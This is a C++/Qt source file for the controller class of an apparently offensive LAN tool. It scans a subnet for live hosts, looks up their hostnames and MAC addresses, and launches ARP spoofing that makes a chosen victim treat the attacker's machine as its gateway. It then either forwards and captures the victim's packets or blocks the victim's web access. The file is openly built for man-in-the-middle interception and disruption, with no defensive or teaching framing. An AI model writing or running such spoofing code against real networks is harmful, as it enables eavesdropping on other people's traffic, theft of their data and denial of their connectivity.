#include "hacker.h"
#include "arpsender.h"
#include "mainwindow.h"
#include "hostinfo.h"
#include "getonlineipsthread.h"
#include "sendnoofingthread.h"
#include "getpacketsthread.h"
#include "querymacthread.h"
#include "gethostnamethread.h"
#include "global_define.h"

#include <QDebug>
#include <QFile>

Hacker::Hacker(QObject *parent)
    : main_ui((MainWindow*)parent),
      hostInfo(new HostInfo()),
      ipResolver(new IPTools()),
      arpSender(new ARPSender()),
      getOnlineIPsThread(new GetOnlineIPsThread(this)),
      sendArpSnoofingThread(new SendArpSnoofingThread(arpSender)),
      getPacketsThread(new GetPacketsThread()),
      getHostnameThread(NULL),
      queryMacThread(new QueryMacThread(arpSender))
{
}

Hacker::~Hacker()
{
    delete getOnlineIPsThread;
    delete arpSender;
    delete ipResolver;
    delete sendArpSnoofingThread;
    delete getPacketsThread;
    delete queryMacThread;
    delete hostInfo;
}

//Called by UI thread.
//create a thread to get online ips.
void Hacker::getOnlineIPs(int startIP, int endIP)
{
    getOnlineIPsThread->setIpRange(startIP, endIP);

    //When one ip is found or scan is finished, tell the UI.
    connect(getOnlineIPsThread, SIGNAL(foundOneOnlineIP(QString)), main_ui, SLOT(oneOnlineIPFound(QString)));
    connect(getOnlineIPsThread, SIGNAL(scanHasFinished()), main_ui, SLOT(scanDone()));
    connect(getOnlineIPsThread, SIGNAL(scanProgressForward(int)), main_ui, SLOT(updateProgress(int)));

    getOnlineIPsThread->start();
}

void Hacker::getHostname(const QString &ip)
{
    getHostnameThread = new GetHostnameThread(ipResolver, ip);
    connect(getHostnameThread, SIGNAL(hostnameReturned(QString)), main_ui, SLOT(updateOneIPInfo(QString)));
    getHostnameThread->start();
}

/* Query the MAC address of destination ip. */
void Hacker::queryMacAddress(const QString& dest_ip)
{
    queryMacThread->setDestIP(dest_ip);
    connect(arpSender, SIGNAL(macAddressReturned(QString)), main_ui, SLOT(showMacAddress(QString)));
    queryMacThread->start();
}

bool block_host_surfing = false;
/* Lie to the dest_ip that we're the gateway */
void Hacker::makeHostRedirectToMe(const QString& dest_ip, bool block_host_surf)
{
    block_host_surfing = block_host_surf;
    //When click "stop" from UI, sendArpSnoofingThread should react to that signal and stop sending.
    connect(main_ui, SIGNAL(stopHacking()), sendArpSnoofingThread, SLOT(terminate()));
    connect(arpSender, SIGNAL(macAddressReturned(QString)), this, SLOT(startPackerForwarding(QString)));

    sendArpSnoofingThread->setDestIP(dest_ip);

    getPacketsThread->setVictimIpAddr(dest_ip);
    queryMacAddress(dest_ip);
}

void Hacker::startPackerForwarding(const QString &mac_addr)
{
    sendArpSnoofingThread->start();

    if(!block_host_surfing){
        getPacketsThread->setVictimMacAddr(mac_addr);
        getPacketsThread->start();
    }else{
        if(getPacketsThread->isRunning()){
            getPacketsThread->terminate();
        }
    }
}
